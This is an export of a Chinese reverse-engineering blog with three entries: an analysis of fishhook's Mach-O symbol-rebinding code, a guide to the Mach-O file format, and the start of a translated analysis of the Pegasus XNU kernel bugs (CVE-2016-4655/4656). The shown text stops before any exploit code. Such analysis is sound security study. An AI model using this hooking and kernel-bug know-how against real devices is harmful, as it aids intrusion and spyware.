中。同时给 new_entry-&gt;rebindings_nel 赋值为数组的个数，将 new_entry-&gt;next 赋值为 *rebindings_head 指针，即 _rebindings_head 内的数值。最后再使 _rebindings_head 与 new_entry 指向同一个地址。 这里比较容易混淆的是 rebindings_head 与 _rebindings_head。rebind_symbols 函数调用 prepend_rebindings 函数时，传入的是 &amp;_rebindings_head，也就是结构体指针的地址，是一个二级指针。prepend_rebindings 函数接收这个参数用的是 struct rebindings_entry **rebindings_head，也就是说 *rebindings_head 就是 _rebinding_head 指针。 上面的动图很容易看出，这个链表是如何形成的。回到 rebind_symbols 函数中的遗留问题，_rebindings_head-&gt;next 的值为空时，是什么意思？这意味着 rebind_symbols 函数第一次被调用，因为之后被调用，_rebindings_head-&gt;next 都指向的是前一个被添加进链表的 new_entry。也只有在第一次被调用时，才需要注册回调函数，之后都是直接调用即可。 rebind_symbols_for_image 函数在 _rebind_symbols_for_image 中，就执行了一个调用 rebind_symbols_for_image 函数的操作。接下来是比较核心的部分了。 1234567891011121314151617181920212223242526272829303132static void rebind_symbols_for_image(struct rebindings_entry *rebindings, const struct mach_header *header, intptr_t slide) &#123; Dl_info info; if (dladdr(header, &amp;info) == 0) &#123; return; &#125; segment_command_t *cur_seg_cmd; segment_command_t *linkedit_segment = NULL; struct symtab_command* symtab_cmd = NULL; struct dysymtab_command* dysymtab_cmd = NULL; uintptr_t cur = (uintptr_t)header + sizeof(mach_header_t); for (uint i = 0; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123; cur_seg_cmd = (segment_command_t *)cur; if (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123; if (strcmp(cur_seg_cmd-&gt;segname, SEG_LINKEDIT) == 0) &#123; linkedit_segment = cur_seg_cmd; &#125; &#125; else if (cur_seg_cmd-&gt;cmd == LC_SYMTAB) &#123; symtab_cmd = (struct symtab_command*)cur_seg_cmd; &#125; else if (cur_seg_cmd-&gt;cmd == LC_DYSYMTAB) &#123; dysymtab_cmd = (struct dysymtab_command*)cur_seg_cmd; &#125; &#125; if (!symtab_cmd || !dysymtab_cmd || !linkedit_segment || !dysymtab_cmd-&gt;nindirectsyms) &#123; return; &#125;//接下段代码 首先定义了4个会被用到的结构体指针。其中 segment_command_t 就是LC_SEGMENT_64 结构，symtab_command 是 Section Header 中 LC_SYMTAB 的结构，dysymtab_command 是 Section Header 中 LC_DYSYMTAB 的结构。（有关 Mach-O 文件的结构可以参考我之前的文章 解读 Mach-O 文件格式） 接下来跳过 Mach-O 的 Header 结构，开始遍历 Load Commands。通过 Header-&gt;ncmds，以及 Segment-&gt;cmdsize 来控制循环。通过遍历，找到 LC_SEGMENT_64(_LINKEDIT)，赋值给 linkedit_segment，然后给 symtab_cmd 和 dysymtab_cmd 赋值。 123456789//接上段代码// Find base symbol/string table addresses uintptr_t linkedit_base = (uintptr_t)slide + linkedit_segment-&gt;vmaddr - linkedit_segment-&gt;fileoff; nlist_t *symtab = (nlist_t *)(linkedit_base + symtab_cmd-&gt;symoff); char *strtab = (char *)(linkedit_base + symtab_cmd-&gt;stroff); // Get indirect symbol table (array of uint32_t indices into symbol table) uint32_t *indirect_symtab = (uint32_t *)(linkedit_base + dysymtab_cmd-&gt;indirectsymoff);//接下段代码 通过找到的 _LINKEDIT 段和传入的参数 slide 来计算 base 地址。也就是这个 Mach-O 文件在 ASLR 偏移后的首地址。个人觉得这里不一定要用 _LINKEDIT 段，其他段也是一样的。 base = vmaddr - fileoffset + slide。 然后 base + symtab 段的 Symbol Table Offset（该表在文件中的偏移） = symtab 的首地址（该表在内存中的偏移），base + symtab 段的 String Table Offset = strtab 的首地址。base + DYSYTAB 段的 IndSym Table Offset = 动态符号表的首地址。 12345678910111213141516171819202122//接上段代码cur = (uintptr_t)header + sizeof(mach_header_t); for (uint i = 0; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123; cur_seg_cmd = (segment_command_t *)cur; if (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123; if (strcmp(cur_seg_cmd-&gt;segname, SEG_DATA) != 0 &amp;&amp; strcmp(cur_seg_cmd-&gt;segname, SEG_DATA_CONST) != 0) &#123; continue; &#125; for (uint j = 0; j &lt; cur_seg_cmd-&gt;nsects; j++) &#123; section_t *sect = (section_t *)(cur + sizeof(segment_command_t)) + j; if ((sect-&gt;flags &amp; SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) &#123; perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab); &#125; if ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123; perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab); &#125; &#125; &#125; &#125;&#125; 这是一个嵌套循环，外层循环依旧是遍历 Load Commands，内循环则是遍历 LC_SEGMENT_64(_DATA) 段内的 Section Header，通过 Section-&gt;flags &amp; SECTION_TYPE 来寻找 _nl_symbol_ptr 和 _la_symbol_ptr。找到后调用 perform_rebinding_with_section 函数。 在循环内的 if 语句嵌套，一般最多用两层，太多层会显得代码冗杂，且可读性较差，容易出错。那两层以上怎么办呢？fishhook 给了我们一个很好的示范。用 if 语句作非判断，然后加上 continue 跳出本次循环。详见上面的代码。 perform_rebindin_with_section 函数123456789101112131415161718192021222324252627282930313233343536static void perform_rebinding_with_section(struct rebindings_entry *rebindings, section_t *section, intptr_t slide, nlist_t *symtab, char *strtab, uint32_t *indirect_symtab) &#123; uint32_t *indirect_symbol_indices = indirect_symtab + section-&gt;reserved1; void **indirect_symbol_bindings = (void **)((uintptr_t)slide + section-&gt;addr); for (uint i = 0; i &lt; section-&gt;size / sizeof(void *); i++) &#123; uint32_t symtab_index = indirect_symbol_indices[i]; if (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL || symtab_index == (INDIRECT_SYMBOL_LOCAL | INDIRECT_SYMBOL_ABS)) &#123; continue; &#125; uint32_t strtab_offset = symtab[symtab_index].n_un.n_strx; char *symbol_name = strtab + strtab_offset; if (strnlen(symbol_name, 2) &lt; 2) &#123; continue; &#125; struct rebindings_entry *cur = rebindings; while (cur) &#123; for (uint j = 0; j &lt; cur-&gt;rebindings_nel; j++) &#123; if (strcmp(&amp;symbol_name[1], cur-&gt;rebindings[j].name) == 0) &#123; if (cur-&gt;rebindings[j].replaced != NULL &amp;&amp; indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123; *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i]; &#125; indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement; goto symbol_loop; &#125; &#125; cur = cur-&gt;next; &#125; symbol_loop:; &#125;&#125; 这里需要注意的是指针的加法。比如 uint32_t *indirect_symbol_indices = indirect_symtab + section-&gt;reserved1; 这句代码中，三个变量均为 uint32_t 格式，即4个字节，那么 indirect_symtab 指针实际应该加上 （reserved1 的值 * 4）个字节。以 _nl_symbol_ptr 为例： reserved1（也就是上图 MachOView 中显示的 Indirect Sym Index）为25，那么在动态符号表中 _nl_symbol_ptr 所在的首地址应该是（先不考虑 slide）： Dynamic Symbol Table 的首地址 + (reserved1 * 4) = 0x100005F30 + 0x64 = 0x100005F94。 slide + section-&gt;addr 为 _nl_symbol_ptr section 数据所在的地址。然后遍历 dysymtab 中从 _nl_symbol_ptr 开始的符号，取得 Symbol 数据，如果为 INDIRECT_SYMBOL_ABS(即懒加载符号指针结束的地方)等，则跳出本次循环。否则将取得的 Symbol 数据作为 symtab 中的 offset。 如上图所示，_dyld_stub_binder 符号（也是这个程序中的 _nl_symbol_ptr 的首个符号）在 dysymtab 中的 Symbol 数据为0xA1，那么在对应的 symtab 中，它的地址应为 symtab 首地址 + 0xA1 16 = 0x10005510 + 161 16 = 0x10005F20。(16是 n_list 结构共16个字节) Symbol Table 中的 n_strx（之前提到的 n_list 结构）即为 strtab 中的 index。 最后就是匹配替换了。比较字符串表中的字符串与 rebindings 数组中的 name 字段，匹配成功后，将 _nl_symbol_ptr 或 _la_symbol_ptr 这两个 Section 的指针表中对应的函数指针（indirect_symbol_bindings[i]）赋值给 rebindings 数组中的 replaced 字段，然后用数组中的 replacement 字段（也就是自定义的 my_open 或 my_close 函数的指针）覆盖原来的函数指针。 这里使用了 goto 来跳出双重循环，值得参考。 Reference[1] 动态修改 C 语言函数的实现 http://draveness.me/fishhook/[2] 趣探 Mach-O：FishHook 解析 http://www.open-open.com/lib/view/open1487057519754.html[3] 编译体系漫游 http://www.tuicool.com/articles/uI7Bria 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[解读 Mach-O 文件格式]]></title>
      <url>https://amywushu.github.io/2017/02/21/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E8%A7%A3%E8%AF%BB-Mach-O-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.html</url>
      <content type="text"><![CDATA[桃花坞里桃花庵，桃花庵里桃花仙。桃花仙人种桃树，又摘桃花换酒钱。酒醒只在花前坐，酒醉还来花下眠。半醉半醒日复日，花开花落年复年。但愿老死花酒间，不愿鞠躬车马前。 ——唐寅《桃花庵歌》 框架图 Mach-O 是 Apple 系统上（包括 MacOS 以及 iOS）的可执行文件格式，类似于 windows 上的 PE 文件以及 linux 上的 ELF 文件。上图左边为官方图，右边为用 MachOView 软件打开的 Mach-O 文件图。可以非常清晰的看到，这种文件格式由文件头（Header）、加载命令（Load Commands）以及具体数据（Segment&amp;Section）组成。下面一一介绍。 Header123456789101112131415161718192021222324252627282930313233343536/* * The 32-bit mach header appears at the very beginning of the object file for * 32-bit architectures. */struct mach_header &#123; uint32_t magic; /* mach magic number identifier */ cpu_type_t cputype; /* cpu specifier */ cpu_subtype_t cpusubtype; /* machine specifier */ uint32_t filetype; /* type of file */ uint32_t ncmds; /* number of load commands */ uint32_t sizeofcmds; /* the size of all the load commands */ uint32_t flags; /* flags */&#125;;/* Constant for the magic field of the mach_header (32-bit architectures) */#define MH_MAGIC 0xfeedface /* the mach magic number */#define MH_CIGAM 0xcefaedfe /* NXSwapInt(MH_MAGIC) *//* * The 64-bit mach header appears at the very beginning of object files for * 64-bit architectures. */struct mach_header_64 &#123; uint32_t magic; /* mach magic number identifier */ cpu_type_t cputype; /* cpu specifier */ cpu_subtype_t cpusubtype; /* machine specifier */ uint32_t filetype; /* type of file */ uint32_t ncmds; /* number of load commands */ uint32_t sizeofcmds; /* the size of all the load commands */ uint32_t flags; /* flags */ uint32_t reserved; /* reserved */&#125;;/* Constant for the magic field of the mach_header_64 (64-bit architectures) */#define MH_MAGIC_64 0xfeedfacf /* the 64-bit mach magic number */#define MH_CIGAM_64 0xcffaedfe /* NXSwapInt(MH_MAGIC_64) */ 以上是 Header 在代码中的定义，它在文件中的作用主要是：使系统能够快速定位其运行环境以及文件类型等等。 分析文件头的 otool 命令为： otool -h 可执行文件 ，或者可视化强一点的 otool -hv 可执行文件。 Fat 格式的文件（既包含有32位的二进制文件，又包含有64位的二进制文件），会在两个架构的二进制文件之前（也就是最开始的部分）有一个 Fat Header，其中 magic 为 0xCAFEBABE，然后是包含有的架构的个数，以及每个架构在文件中的偏移和大小等。 filetype 以及 flags 只列举了几个比较常见的定义，还有其他的详见EXTERNAL_HEADERS/mach-o/x86_64/loader.h。 Load CommandsLoad Commands 是跟在 Header 后面的加载命令区，所有 commands 的大小总和即为 Header-&gt;sizeofcmds 字段，共有 Header-&gt;ncmds 条加载命令。 1234struct load_command &#123; uint32_t cmd; /* type of load command */ uint32_t cmdsize; /* total size of command in bytes */&#125;; Command 以 LC 开头，不同的加载命令有不同的专有的结构体，cmd 和 cmdsize 是都有的，分别为命令类型（即命令名称），这条命令的长度。这些加载命令告诉系统应该如何处理后面的二进制数据，对系统内核加载器和动态链接器起指导作用。如果当前 LC_SEGMENT 包含 section，那么 section 的结构体紧跟在 LC_SEGMENT 的结构体之后，所占字节数由 SEGMENT 的 cmdsize 字段给出。 Cmd 作用 LC_SEGMENT/LC_SEGMENT_64 将对应的段中的数据加载并映射到进程的内存空间去 LC_SYMTAB 符号表信息 LC_DYSYMTAB 动态符号表信息 LC_LOAD_DYLINKER 启动动态加载连接器/usr/lib/dyld程序 LC_UUID 唯一的 UUID，标示该二进制文件，128bit LC_VERSION_MIN_IPHONEOS/MACOSX 要求的最低系统版本（Xcode中的Deployment Target） LC_MAIN 设置程序主线程的入口地址和栈大小 LC_ENCRYPTION_INFO 加密信息 LC_LOAD_DYLIB 加载的动态库，包括动态库地址、名称、版本号等 LC_FUNCTION_STARTS 函数地址起始表 LC_CODE_SIGNATURE 代码签名信息 使用命令 otool -l 可执行文件 可以查看加载命令区，使用 otool -l 可执行文件 | grep cryptid 可以查看是否加密。 SegmentMach-O 文件有多个段（Segment），每个段有不同的功能。然后每个段又分为很多小的 Section。 LC_SEGMENT 意味着这部分文件需要映射到进程的地址空间去。一般有以下段名： __PAGEZERO: 空指针陷阱段，映射到虚拟内存空间的第一页，用于捕捉对 NULL 指针的引用。__TEXT: 包含了执行代码以及其他只读数据。该段数据可以 VM_PROT_READ(读)、VM_PROT_EXECUTE(执行)，不能被修改。 __DATA: 程序数据，该段可写 VM_PROT_WRITE/READ/EXECUTE。__LINKEDIT: 链接器使用的符号以及其他表。 段的结构体定义为： 12345678910111213141516171819202122232425262728struct segment_command &#123; /* for 32-bit architectures */ uint32_t cmd; /* LC_SEGMENT */ uint32_t cmdsize; /* includes sizeof section structs */ char segname[16]; /* segment name */ uint32_t vmaddr; /* memory address of this segment 段的虚拟内存地址*/ uint32_t vmsize; /* memory size of this segment 段的虚拟内存大小*/ uint32_t fileoff; /* file offset of this segment 段在文件中的偏移量*/ uint32_t filesize; /* amount to map from the file 段在文件中的大小*/ vm_prot_t maxprot; /* maximum VM protection */ vm_prot_t initprot; /* initial VM protection */ uint32_t nsects; /* number of sections in segment */ uint32_t flags; /* flags */&#125;;struct segment_command_64 &#123; /* for 64-bit architectures */ uint32_t cmd; /* LC_SEGMENT_64 */ uint32_t cmdsize; /* includes sizeof section_64 structs */ char segname[16]; /* segment name */ uint64_t vmaddr; /* memory address of this segment */ uint64_t vmsize; /* memory size of this segment */ uint64_t fileoff; /* file offset of this segment */ uint64_t filesize; /* amount to map from the file */ vm_prot_t maxprot; /* maximum VM protection */ vm_prot_t initprot; /* initial VM protection */ uint32_t nsects; /* number of sections in segment */ uint32_t flags; /* flags */&#125;; 其中 nsects 字段就是表明该段中有多少个 section。文件映射的起始位置是由 fileoff 给出，映射到地址空间的 vmaddr 处。 SectionSection 是具体有用的数据存放的地方。它的结构体跟随在 LC_SEGMENT 结构体之后，LC_SEGMENT 又在 Load Commands 中，但是 segment 的数据内容是跟在 Load Commands 之后的。它的结构体为： 12345678910111213141516171819202122232425262728struct section &#123; /* for 32-bit architectures */ char sectname[16]; /* name of this section */ char segname[16]; /* segment this section goes in */ uint32_t addr; /* memory address of this section 该节在内存中的起始位置*/ uint32_t size; /* size in bytes of this section 该节的大小*/ uint32_t offset; /* file offset of this section 该节的文件偏移*/ uint32_t align; /* section alignment (power of 2) 字节大小对齐*/ uint32_t reloff; /* file offset of relocation entries 重定位入口的文件偏移*/ uint32_t nreloc; /* number of relocation entries 需要重定位的入口数量*/ uint32_t flags; /* flags (section type and attributes) */ uint32_t reserved1; /* reserved (for offset or index) */ uint32_t reserved2; /* reserved (for count or sizeof) */&#125;;struct section_64 &#123; /* for 64-bit architectures */ char sectname[16]; /* name of this section */ char segname[16]; /* segment this section goes in */ uint64_t addr; /* memory address of this section */ uint64_t size; /* size in bytes of this section */ uint32_t offset; /* file offset of this section */ uint32_t align; /* section alignment (power of 2) */ uint32_t reloff; /* file offset of relocation entries */ uint32_t nreloc; /* number of relocation entries */ uint32_t flags; /* flags (section type and attributes)*/ uint32_t reserved1; /* reserved (for offset or index) */ uint32_t reserved2; /* reserved (for count or sizeof) */ uint32_t reserved3; /* reserved */&#125;; 其中 flag 字段分为两个部分，一个是区域类型（section type），一个是区域属性（section attributes）。其中 type 是互斥的，即只能有一个类型，而 attributes 不是互斥的，可以有多个属性。如果段（segment）中的任何一个 section 拥有属性 S_ATTR_DEBUG，那么该段所有的 section 都必须拥有这个属性。具体的flag字段内容以及意义请参考 /usr/include/mach-o/loader.h。 段名为大写，节名为小写。各节的作用主要有： __text: 主程序代码__stub_helper: 用于动态链接的存根__symbolstub1: 用于动态链接的存根__objc_methname: Objective-C 的方法名__objc_classname: Objective-C 的类名__cstring: 硬编码的字符串 __lazy_symbol: 懒加载，延迟加载节，通过 dyld_stub_binder 辅助链接_got: 存储引用符号的实际地址，类似于动态符号表__nl_symbol_ptr: 非延迟加载节__mod_init_func: 初始化的全局函数地址，在 main 之前被调用__mod_term_func: 结束函数地址__cfstring: Core Foundation 用到的字符串（OC字符串） __objc_clsslist: Objective-C 的类列表__objc_nlclslist: Objective-C 的 +load 函数列表，比 __mod_init_func 更早执行__objc_const: Objective-C 的常量__data: 初始化的可变的变量__bss: 未初始化的静态变量 查看某段中某节的命令为： otool -s __TEXT __text 可执行文件。 与 IDA 的对应地址如果用 MachOView 来查看的话，界面左上角有一个 RAW、RVA 的选项。RAW 就是指该字节相对于文件开始部分的绝对偏移，文件头部的地址是从0x000开始的。RVA 是相对于某个基地址的偏移，也就是整体的绝对偏移值再加上某个基地址，文件头部的地址是从某个值（基地址）开始的。 这个所谓的基地址其实是 LC_SEGMENT_64(_PAGEZERO) 中的 VM_Size 字段的值，因为留出这段空白页面就是为了捕获程序的空指针，以及考虑到页面对齐。IDA 中就是使用的 RVA 地址。这个地址在 armv7 中是0x4000，arm64 中是0x10000 0000。 Section(__TEXT,__text) 所在的 RVA 地址，对应的就是 IDA 解析的函数开始地址。 IDA 解析的 Mach-O 文件中的函数都位于 Section(__TEXT) 段，然后还会接着解析 Section(__DATA) 段，即 IDA 中的数据区。 LC_MAIN 加载命令中的 Entry Offset 字段 + 基地址（RVA 选项下的文件头部地址） = IDA 中左侧函数 _main 的地址。 Reference[1] mach-o格式分析 http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/#[2] 趣探 Mach-O：文件格式分析 http://www.jianshu.com/p/54d842db3f69[3] 网易云课堂《iOS逆向与安全》 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[（译）Analysis and exploitation of Pegasus kernel vulnerabilities (CVE-2016-4655 / CVE-2016-4656)]]></title>
      <url>https://amywushu.github.io/2016/12/16/%E8%AF%91-Analysis-and-exploitation-of-Pegasus-kernel-vulnerabilities-CVE-2016-4655-CVE-2016-4656.html</url>
      <content type="text"><![CDATA[四面都是夜的峭壁，八方来风尽是不详耳语，我坐在我摇摇欲坠的鸟巢上痛苦。我的翅翼下有什么呢？我拢住的只是虚空。 ——微博@逃亡者的恰恰 翻译自 jndok’s blog &emsp; 原文链接：http://jndok.github.io/2016/10/04/pegasus-writeup/ Introduction大家好，在这篇博文中，我决定讲述一些原理，是关于两个在 Pegasusu spyware 中提到的 OS X/iOS 的内核漏洞的，影响至 OS X 10.11.6 以及 iOS 9.3.4 版本。我尝试对这些漏洞以及它们的利用程序进行深入的分析。 由于这是我写下的第一篇博客，因此有什么错误或粗糙的地方，还请你多一点耐心，如果你发现任何错误或者困扰的地方，请发邮件给我 me@jndok.net ，我将会尽力帮助你。 最后一点需要注意的地方就是：我们只将着重讲述 OS X 内核。这是由于在 iOS 上采取的安全措施，使得在 iOS 的环境中来利用这两个漏洞实在是要困难得多。另外，这篇博文也针对初学者，我们将尽量使讲述直接明了。 以下是本文的结构： 介绍（Introduction） OSUnserializeBinary 概览 —— OSUnserializeBinary 的细节、数据格式以及具体如何运行。 （Overview of OSUnserializeBinary） 漏洞分析 —— 两个漏洞的具体分析 （Bugs analysis） 利用程序 —— 非常有趣的部分！ （Exploitation） 总结（Conclusion） OSUnserializeBinary 概览XNU 内核实现了自己的一套规则，叫做 OSUnserializeXML，是用来对被存入内核的 XML 格式的数据进行反序列化。最近，OSUnserializeBinary 作为新的函数加入了它。这个函数的用途跟 XML 是差不多的，但是处理的格式并不相同。OSUnserializeBinary 将二进制格式转换为基本内核数据对象。这种二进制格式虽然没有文档描述，但是非常简单。在分析函数的代码之前，我们先讲解一下这种格式。 OSUnserializeBinary 的二进制格式OSUnserializeBinary 处理的二进制数据是简单的连续的 uint32_t（32位）数据流。成员为32位的数组可能更能体现这种描述。仅仅只是一个接一个的一串数据，每个整数都描述了一些信息。有效数据流的首个整数要求是一个唯一的签名（0x000000d3）。然后每个其他的整数值都使用其中的一些位来描述数据类型，数据大小。当然也可以表示数据。 123456789101112131415161718#define kOSSerializeBinarySignature "\323\0\0" /* 0x000000d3 */enum &#123; kOSSerializeDictionary = 0x01000000U, kOSSerializeArray = 0x02000000U, kOSSerializeSet = 0x03000000U, kOSSerializeNumber = 0x04000000U, kOSSerializeSymbol = 0x08000000U, kOSSerializeString = 0x09000000U, kOSSerializeData = 0x0a000000U, kOSSerializeBoolean = 0x0b000000U, kOSSerializeObject = 0x0c000000U, kOSSerializeTypeMask = 0x7F000000U, kOSSerializeDataMask = 0x00FFFFFFU, kOSSerializeEndCollection = 0x80000000U,&#125;; 正如你所看到的，第31位（红色部分）通常用来表明当前的集合（collection）是否结束，第32-&gt;24位（蓝色部分）用来存储实际的数据类型，第23-&gt;0位（绿色部分）用来存储实际的元素长度。 实际的例子可能更容易理解，如下： 0x000000d3 0x81000000 0x09000004 0x00414141 0x8b000001 以上数据对应的二进制格式为： &lt;dict> &lt;string>AAA&lt;/string> &lt;boolean>1&lt;/boolean> &lt;/dict> 你可以看到，我们给字典（dictionary）里的第一个集合的最后一个元素做了标记（0x81000000），布尔量（boolean）作为第二集合的最后一个元素（0x8b000001）。然后我们直接把字符数据（AAA）编码嵌入其中，包含了最后一个 \0 结束标识（0x00414141）。最后，对于布尔量，不需要再对数据进行编码了，因为它的大小（最后一位）就代表了这个量是为 TRUE 还是 FALSE。 还有一个重点是关于集合的概念，以及如何标记集合的结束。一个集合表示的是同一层次上的一组对象。举例来说，一个字典里的元素都属于同一个集合。当为 OSUnserializeBinary 制作二进制字典时，尤为重要的是，通过设置第一位（也就是 enum 中的 kOSSerializeEndCollection 标志）来标记集合的结束。下面是一个 XML 的例子，能够更好的阐明这个概念： &lt;dict> &lt;!-- dict, level 0 | END! --> &lt;string>AAA&lt;/string> &lt;!-- string, level 1 --> &lt;boolean>1&lt;/boolean> &lt;!-- bool, level 1 --> &lt;string>BBB&lt;/string> &lt;!-- string, level 1 --> &lt;boolean>1&lt;/boolean> &lt;!-- bool, level 1 --> &lt;dict> &lt;!-- dict, level 1 --> &lt;string>CCC&lt;/string> &lt;boolean>1&lt;/boolean> &lt;!-- bool, level 2 | END! --> &lt;/dict> &lt;string>DDD&lt;/string> &lt;!-- string, level 1 --> &lt;boolean>1&lt;/boolean> &lt;!-- bool, level 1 | END! --> &lt;/dict> 你可以在这个例子中看见很多层次或者集合。你也可以看见我是如何对每个层次/集合的最后一个元素做结束标记的。如果你忘记这样做了，OSUnserializeBinary 将会退出然后返回一个有关于错误的 error 参数，所以请一定要记住！另外还要注意，在最外层的字典中，我对最后一个元素，其实也就是 level 0 中的唯一一个元素做了结束标记。 希望现在你能较好的理解二进制格式了！我们将要开始准备分析 OSUnserializeBinary 的代码了。 OSUnserializeBinary 分析OSUnserializeBinary 只在 OSUnserializeXML 中调用。如果函数在输入数据的最开始发现了唯一的二进制标识（0x000000d3），那么它就知道这部分数据是二进制格式的，而不是 XML，然后就会把这些数据传递给 OSUnserializeBinary。 libkern/c++/OSUnserializeXML.cpp 123456789101112131415OSObject* OSUnserializeXML(const char *buffer, size_t bufferSize, OSString **errorString)&#123; if (!buffer) return (0); if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (0); if (!strcmp(kOSSerializeBinarySignature, buffer)) return OSUnserializeBinary(buffer, bufferSize, errorString); // XML must be null terminated if (buffer[bufferSize - 1]) return 0; return OSUnserializeXML(buffer, errorString);&#125; OSUnserializeBinary 的实际代码，最新的可被攻击的 OS X 版本在这里。 简单地说，代码所做的就是一直迭代包含了二进制数据的缓冲区，一次解析一个 uint32_t。在解析过程中，它将会创建一个 OSObject* 返回给调用者。这个返回对象是一个容器（container）对象，意味着这种对象可以包含其他的对象。也就是说，无论是一个字典，一个数组或者一个散列集合，一旦在这种格式下实现，它们就是唯一的容器对象。 这意味着，在 level 0（也被叫做第一个集合）上，只能有一个对象，而这个对象必须是一个容器。换句话说，所有的你构造的二进制数据必须包含一个字典，或是数组，或是散列集合。在 level 0 上，第一个有效的容器之前或之后出现的任何对象都将被忽略。 基于以上的概念，现在开始浏览代码吧。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849... while (ok) &#123; bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) &#123; case kOSSerializeDictionary: ... case kOSSerializeArray: ... case kOSSerializeSet: ... case kOSSerializeObject: ... case kOSSerializeNumber: ... case kOSSerializeSymbol: ... case kOSSerializeString: ... case kOSSerializeData: ... case kOSSerializeBoolean: ... default: break; &#125; ... 在一些初始化和基本的正常检测之后，这个函数开始了它的主要的 while (ok) 循环。这是一个反序列化操作循环，将会迭代二进制数据，一个整数接一个整数，并且反序列化这些数据对象。 在这个片段的最开始，是循环增量的代码部分，同时也读取了当前的整数，并赋值给 key。当前数据的长度随后被算出，并保存在 len 中。最后，如果 kOSSerializeEndCollecton 标识在当前 key 中被设置了，则设置布尔变量 end。 然后，key 中的数据类型将会被 switch，每一个 case 都会适当的分配一个与它的数据类型格式相对应的对象。比如，kOSSerializeDictionary case： 1234case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; o 是一个 OSObject 指针，指向当前循环中的正在反序列化的对象，会在每个 case 中被赋值。 123456case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; 因为在数据流中，OSData 对象代表了嵌入的数据，bufferPos 会适当地增加，以跳过内联数据部分，避免把它们当作二进制格式输入。使用同样的内联数据，也会创建一个 OSData 对象，然后 o 被设置为新的实例。最后，next 也会增加，同样是为了跳过内联数据。 通过阅读 switch 语句，你应该能够较容易的明白每一个 case，因为这些代码都非常相像。 所以，现在让我们跳过 switch 语句。 1if (!(ok = (o != 0))) break; 如果 o 仍为 NULL，比如，在这个循环中没有有效的对象被反序列化，则退出。 123456if (!isRef)&#123; setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++;&#125; 这也是这个代码的非常重要的部分，因为我们的其中一个漏洞就跟它有关。我们将会在之后介绍这个漏洞，所以请仔细的看接下来的部分。 基本上，这段代码说的是，如果反序列化的对象不是一个引用（比如，一个指向我们的数据格式中其他对象的指针，你可以通过 kOSSerializeObject 来创建），则把这个对象保存到 objsArray 数组中，这是一个由 OSUnserializeBinary 创建的数组，用来保持对每个反序列化对象的追踪，除了我们提到过的引用。 让我们一起来看看 setAtIndex 宏定义吧： 123456789101112131415#define setAtIndex(v, idx, o) \ if (idx &gt;= v##Capacity) \ &#123; \ uint32_t ncap = v##Capacity + 64; \ typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o)); \ if (!nbuf) ok = false; \ if (v##Array) \ &#123; \ bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \ kfree(v##Array, v##Capacity * sizeof(o)); \ &#125; \ v##Array = nbuf; \ v##Capacity = ncap; \ &#125; \ if (ok) v##Array[idx] = o; 如果我们将要存储的数据的索引比现在的数组大小还要大的话，数组将会增加。否则，将会进行简单的解引用和存储操作。现在让我们回到主循环代码吧。 123456789101112131415161718192021222324252627282930313233343536if (dict)&#123; if (sym) &#123; if (o != dict) ok = dict-&gt;setObject(sym, o, true); o-&gt;release(); sym-&gt;release(); sym = 0; &#125; else &#123; sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) &#123; sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; &#125; ok = (sym != 0); &#125; &#125; else if (array) &#123; ok = array-&gt;setObject(o); o-&gt;release(); &#125; else if (set) &#123; ok = set-&gt;setObject(o); o-&gt;release(); &#125; else &#123; assert(!parent); result = o; &#125; if-else 语句负责存储每个反序列化对象到我们之前所提到过的容器中。注意这里的三个变量（dict, array, 以及 set）将会在第一个循环中被置 NULL，并且会一直保持，直到在数据流中找到一个字典，数组或者散列集合。 这意味着 result 指针（返回的对象）将会在数据中一直向前移动，直到找到合适的容器对象。所以，在 level 0 上，位于适当的容器对象之前或者之后的对象，都会被忽略。 现在把重点放在 if (dict) 分支上，因为它对于我们的 UAF 漏洞来说也很重要。正如你可能知道的，一个字典包含着交替的对象，一个代表着 key，另外一个代表着 value。 key，作为 OSUnserializeBinary 格式的特例，只能是 OSString 或者 OSSymbol 类型。正如你在上面的代码片段中看到的那样，如果是 OSString ，那么它将会被自动转换为 OSSymbol。 现在，这段代码就是保持着在 keys 和 values 之间交替。sym 将会在第一次循环中被置 NULL，所以 else 分支将会被调用。它假设字典的第一个值是 key，所以判断是 OSSymbol 或者 OSString，然后都转换到 OSSymbol 中。在下一次迭代时，我们将会处理这个 key 